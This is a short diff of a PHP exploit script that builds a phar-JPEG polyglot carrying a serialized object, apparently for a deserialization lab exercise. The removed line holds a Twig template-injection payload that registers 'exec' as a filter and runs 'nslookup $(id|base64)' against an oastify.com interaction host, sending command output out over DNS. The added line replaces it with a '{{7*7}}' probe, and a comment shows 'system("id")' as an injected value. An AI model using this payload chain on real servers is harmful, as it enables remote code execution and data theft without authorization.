@@ -101,7 +101,7 @@ function generate_polyglot($phar, $jpeg){
 // $object->inject = 'system("id");';
 // $object->out = 'Hallo World';
 
-$object = new CustomTemplate(new Blog("abc",'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup $(id|base64).fsbv6ijbccu23p7eza3h7n6oxf36rwfl.oastify.com")}}'));
+$object = new CustomTemplate(new Blog("abc",'{{7*7}}'));
 // config for jpg
 $tempname = 'temp.tar.phar'; // make it tar
 $jpeg = file_get_contents('in.jpg');
